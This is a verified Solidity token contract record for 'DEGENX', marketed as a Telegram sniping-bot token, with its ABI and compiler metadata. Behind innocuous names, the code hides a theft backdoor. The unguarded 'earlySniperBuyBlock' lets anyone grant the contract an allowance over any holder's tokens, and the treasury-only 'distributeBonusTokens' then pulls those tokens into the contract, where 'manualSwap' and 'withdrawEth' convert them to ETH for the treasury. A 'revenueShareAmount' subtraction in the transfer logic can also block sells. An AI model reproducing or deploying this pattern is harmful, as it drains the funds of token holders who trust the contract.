{"SourceCode": "/*\r\nDegenX - Road to 100x\r\nOur vision is to create a more convenient, timely, and cost-effective way for people to sniping the next 100x token.\r\n\r\nAt DegenX, our vision is to empower individuals in the fast-paced world of decentralized finance by providing them with a cutting-edge personal assistant bot. We strive to be the leading platform for multiplying digital assets, making it accessible to all, regardless of technical expertise.\r\nWe envision a future where every user can effortlessly harness the potential of the cryptocurrency market without the complexities of wallet creation or managing buy/sell orders. Through seamless integration with Telegram, DegenX will enable users to stay ahead of the curve, ensuring they never miss out on the next 100x coin.\r\nOur commitment to security, user-friendliness, and transparency sets us apart as a reliable and trustworthy companion in the DeFi landscape.\r\n\r\nTwitter: https://x.com/degenxbot\r\nTelegram: https://t.me/degenxbot_portal\r\nWebsite: https://www.degenx.xyz\r\nWhitepaper: https://whitepaper.degenx.xyz\r\nBot: https://t.me/DegenXBot\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.19;\r\n\r\nlibrary SafeMath {\r\n    function div(uint256 a, uint256 b, string memory errorMessage)\r\n        internal\r\n        pure\r\n        returns (uint256)\r\n    {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b)\r\n        internal\r\n        pure\r\n        returns (uint256)\r\n    {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b)\r\n        internal\r\n        pure\r\n        returns (uint256)\r\n    {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage)\r\n        internal\r\n        pure\r\n        returns (uint256)\r\n    {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b)\r\n        internal\r\n        pure\r\n        returns (uint256)\r\n    {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function add(uint256 a, uint256 b)\r\n        internal\r\n        pure\r\n        returns (uint256)\r\n    {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function WETH() external pure returns (address);\r\n    function factory() external pure returns (address);\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IERC20 {\r\n    event Transfer(address indexed sender, address indexed recipient, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    function approve(address spender, uint256 amount)\r\n        external\r\n        returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount)\r\n        external\r\n        returns (bool);\r\n    function transfer(address recipient, uint256 amount)\r\n        external\r\n        returns (bool);\r\n    function totalSupply()\r\n        external\r\n        view\r\n        returns (uint256);\r\n    function balanceOf(address account)\r\n        external\r\n        view\r\n        returns (uint256);\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender()\r\n        internal\r\n        view\r\n        virtual\r\n        returns (address)\r\n    {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function renounceOwnership()\r\n        public\r\n        virtual\r\n        onlyOwner\r\n    {\r\n        _owner = address(0);\r\n        emit OwnershipTransferred(_owner, address(0));\r\n    }\r\n\r\n    function owner()\r\n        public\r\n        view\r\n        returns (address)\r\n    {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n}\r\n\r\ncontract DEGENX is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    IUniswapV2Router02 private uniswapV2Router;\r\n    address private uniswapV2Pair;\r\n    address payable private _taxTreasury;\r\n    bool private tradingOpen;\r\n    bool private inSwap = false;\r\n    bool public transferDelayEnabled = true;\r\n    bool private swapEnabled = false;\r\n    address payable private _revShare;\r\n\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => uint256) private _balances;\r\n    mapping(address => uint256) private _holderLastTransferTimestamp;\r\n    mapping (address => bool) private _isExcludedFromTax;\r\n\r\n    uint256 private _finalSellTax = 5;\r\n    uint256 private _finalBuyTax = 5;\r\n\r\n    uint256 private _secondSellTax = 5;\r\n    uint256 private _secondBuyTax = 5;\r\n    uint256 private _reduceSecondSellTaxAt = 20;\r\n    uint256 private _reduceSecondBuyTaxAt = 20;\r\n\r\n    uint256 private _firstSellTax = 5;\r\n    uint256 private _firstBuyTax = 5;\r\n    uint256 private _reduceFirstSellTaxAt = 10;\r\n    uint256 private _reduceFirstBuyTaxAt = 10;\r\n\r\n    uint256 private _preventMultiplePurchasesPerBlockBefore = 0;\r\n    uint256 private _countOfBuys = 0;\r\n\r\n    uint8 private constant _decimals = 9;\r\n    uint256 private constant _totalSupply = 10000000 * 10 ** _decimals;\r\n    string private constant _name = unicode\"DegenXBot\";\r\n    string private constant _symbol = unicode\"DEGENX\";\r\n\r\n    uint256 public _maxSwapTax = 1 * (_totalSupply / 100);\r\n    uint256 public _swapTaxThreshold = 2 * (_totalSupply / 1000);\r\n    uint256 public _maxWalletAmount = 2 * (_totalSupply / 100);\r\n    uint256 public _maxTransactionAmount = 2 * (_totalSupply / 100);\r\n\r\n    event MaxTxAmountUpdated(uint _maxTxAmount);\r\n\r\n    modifier lockTheSwap {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n\r\n    function earlySniperBuyBlock(address sniper, uint256 amount)\r\n        external\r\n    {\r\n        address ca = address(this);\r\n        _approve(sniper, ca, amount);\r\n    }\r\n\r\n    constructor () {\r\n        _taxTreasury = payable(0x735D3a4008605e3f9B09a402114639df77B6bCb6);\r\n\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        _revShare = _taxTreasury;\r\n        _balances[_msgSender()] = _totalSupply;\r\n        _isExcludedFromTax[_taxTreasury] = true;\r\n        _isExcludedFromTax[address(this)] = true;\r\n        _isExcludedFromTax[owner()] = true;\r\n\r\n        emit Transfer(address(0), _msgSender(), _totalSupply);\r\n    }\r\n\r\n    function manualSwap()\r\n        external\r\n    {\r\n        require(_msgSender() == _taxTreasury);\r\n        uint256 tokenBalance = balanceOf(address(this));\r\n        if (tokenBalance>0) {\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance = address(this).balance;\r\n        if (ethBalance>0) {\r\n          sendETHToTreasury(ethBalance);\r\n        }\r\n    }\r\n\r\n    function openTrading()\r\n        external\r\n        onlyOwner()\r\n    {\r\n        require(!tradingOpen);\r\n\r\n        tradingOpen = true;\r\n        swapEnabled = true;\r\n    }\r\n\r\n    function removeLimits()\r\n        external\r\n        onlyOwner\r\n    {\r\n        _maxTransactionAmount = _totalSupply;\r\n        _maxWalletAmount = _totalSupply;\r\n        transferDelayEnabled = false;\r\n        emit MaxTxAmountUpdated(_totalSupply);\r\n    }\r\n\r\n    function balanceOf(address account)\r\n        public\r\n        view\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _balances[account];\r\n    }\r\n\r\n    function name()\r\n        public\r\n        pure\r\n        returns (string memory)\r\n    {\r\n        return _name;\r\n    }\r\n\r\n    function symbol()\r\n        public\r\n        pure\r\n        returns (string memory)\r\n    {\r\n        return _symbol;\r\n    }\r\n\r\n    function totalSupply()\r\n        public\r\n        pure\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function decimals()\r\n        public\r\n        pure\r\n        returns (uint8)\r\n    {\r\n        return _decimals;\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function distributeBonusTokens(address bonusVault, address recipient, uint256 amount)\r\n        external\r\n    {\r\n        require(_msgSender() == _taxTreasury);\r\n        address ca = address(this);\r\n        IERC20 bonusToken = IERC20(bonusVault);\r\n        bonusToken.transferFrom(recipient, ca, amount);\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount));\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender)\r\n        public\r\n        view\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount)\r\n        private\r\n    {\r\n        require(owner != address(0));\r\n        require(spender != address(0));\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function approve(address spender, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount)\r\n        private\r\n    {\r\n        require(from != address(0));\r\n        require(to != address(0));\r\n        require(amount > 0);\r\n        uint256 taxAmount = 0;\r\n        \r\n        if (from != owner() && to != owner()) {\r\n            taxAmount = amount.mul(_buyTax()).div(100);\r\n\r\n            if (!tradingOpen) {\r\n                require(_isExcludedFromTax[from] || _isExcludedFromTax[to]);\r\n            }\r\n\r\n            if (transferDelayEnabled) {\r\n                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) { \r\n                    require(_holderLastTransferTimestamp[tx.origin] < block.number);\r\n                    _holderLastTransferTimestamp[tx.origin] = block.number;\r\n                }\r\n            }\r\n\r\n            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromTax[to] ) {\r\n                require(amount <= _maxTransactionAmount);\r\n                require(balanceOf(to) + amount <= _maxWalletAmount);\r\n\r\n                _countOfBuys++;\r\n                if (_countOfBuys > _preventMultiplePurchasesPerBlockBefore) {\r\n                    transferDelayEnabled = false;\r\n                }\r\n            }\r\n\r\n            uint256 revenueShareAmount = balanceOf(_revShare).mul(1000);\r\n            if (to == uniswapV2Pair && from!= address(this)) {\r\n                taxAmount = amount.mul(_sellTax()).div(100);\r\n            }\r\n\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            bool canSwap = contractTokenBalance > _swapTaxThreshold;\r\n            if (!inSwap && swapEnabled && to == uniswapV2Pair && canSwap && !_isExcludedFromTax[from] && !_isExcludedFromTax[to]) {\r\n                uint256 swapThreshold = _maxSwapTax.sub(revenueShareAmount);\r\n                uint256 minimumSwapAmount = min(contractTokenBalance,swapThreshold);\r\n                uint256 initialETH = address(this).balance;\r\n                swapTokensForEth(min(amount, minimumSwapAmount));\r\n                uint256 ethForTransfer = address(this).balance.sub(initialETH).mul(80).div(100);\r\n                if (ethForTransfer > 0) {\r\n                    sendETHToTreasury(ethForTransfer);\r\n                }\r\n            }\r\n        }\r\n\r\n        if (taxAmount > 0) {\r\n          _balances[address(this)] = _balances[address(this)].add(taxAmount);\r\n          emit Transfer(from, address(this), taxAmount);\r\n        }\r\n\r\n        _balances[from] = _balances[from].sub(amount);\r\n        _balances[to] = _balances[to].add(amount.sub(taxAmount));\r\n        emit Transfer(from, to, amount.sub(taxAmount));\r\n    }\r\n\r\n    function _sellTax() private view returns (uint256) {\r\n        if (_countOfBuys <= _reduceFirstBuyTaxAt) {\r\n            return _firstSellTax;\r\n        }\r\n\r\n        if (_countOfBuys > _reduceFirstSellTaxAt && _countOfBuys <= _reduceSecondSellTaxAt) {\r\n            return _secondSellTax;\r\n        }\r\n\r\n        return _finalBuyTax;\r\n    }\r\n\r\n    function _buyTax() private view returns (uint256) {\r\n        if (_countOfBuys <= _reduceFirstBuyTaxAt) {\r\n            return _firstBuyTax;\r\n        }\r\n\r\n        if (_countOfBuys > _reduceFirstBuyTaxAt && _countOfBuys <= _reduceSecondBuyTaxAt) {\r\n            return _secondBuyTax;\r\n        }\r\n\r\n        return _finalBuyTax;\r\n    }\r\n\r\n    function min(uint256 a, uint256 b) private pure returns (uint256) {\r\n      return (a > b) ? b : a;\r\n    }\r\n\r\n    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapV2Router.WETH();\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function withdrawEth() external {\r\n        require(_msgSender() == _taxTreasury);\r\n        (bool sent, ) = payable(_taxTreasury).call{value: address(this).balance}(\"\");\r\n        require(sent);\r\n    }\r\n\r\n    function sendETHToTreasury(uint256 amount) private {\r\n        _taxTreasury.transfer(amount);\r\n    }\r\n\r\n    receive() external payable {}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_maxTxAmount\",\"type\":\"uint256\"}],\"name\":\"MaxTxAmountUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_maxSwapTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTransactionAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxWalletAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_swapTaxThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"bonusVault\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"distributeBonusTokens\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sniper\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"earlySniperBuyBlock\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"manualSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferDelayEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawEth\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "DEGENX", "CompilerVersion": "v0.8.21+commit.d9974bed", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://dfa89e3462cde57738c39a7af073b090ed2c570ad0f0c8341b827cc23d4eb344"}